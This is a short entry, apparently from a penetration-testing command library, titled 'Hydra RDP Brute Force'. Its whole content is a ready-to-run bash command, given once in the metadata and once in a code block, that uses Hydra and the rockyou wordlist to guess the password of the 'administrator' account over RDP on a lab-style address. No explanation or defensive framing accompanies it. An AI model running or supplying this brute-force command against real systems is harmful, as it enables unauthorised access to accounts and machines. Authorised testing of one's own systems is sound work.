---
id: cf67ef1c-6be1-4066-9aa1-e0bb3c5a8041
name: Hydra RDP Brute Force
type: command
executor: bash
data: hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://10.10.10.10
output: null
created_at: '2023-04-06T03:56:04.330888+00:00'
updated_at: '2023-04-10T20:25:55.680618+00:00'
---

# Hydra RDP Brute Force

```bash
hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://10.10.10.10
```
